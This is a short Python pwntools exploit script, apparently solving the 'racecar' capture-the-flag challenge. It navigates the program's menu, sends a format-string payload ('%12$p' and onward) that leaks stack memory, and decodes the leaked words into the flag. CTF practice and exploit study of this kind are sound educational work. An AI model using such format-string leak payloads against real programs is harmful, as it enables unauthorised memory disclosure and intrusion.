import pathlib

from pwn import *

import utils.target

# Specify GDB script here (breakpoints etc.)
gdb_script = '''
piebase
'''.format(**locals())

# Binary filename
parent_dir = pathlib.Path(__file__).parent
exe = parent_dir / 'racecar'

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = utils.target.start(exe=str(exe), gdb_script=gdb_script)

io.sendlineafter(b'Name: ', b'Ricky Bobby')
io.sendlineafter(b'Nickname: ', b'Ricky Bobby')

io.sendlineafter(b'> ', b'2')
io.sendlineafter(b'> ', b'2')
io.sendlineafter(b'> ', b'1')

payload = b''
for i in range(12, 12 + 11):
    payload += b'%' + str(i).encode('ascii') + b'$p '

io.sendlineafter(b'> ', payload)

io.recvline()
io.recvline()

flag_data = io.recvline()[:-2]

flag = ''
for hex_data in flag_data.decode('utf-8').split(' '):
    flag += pack(int(hex_data, base=16), 32, 'little').decode("utf-8")

success(flag)
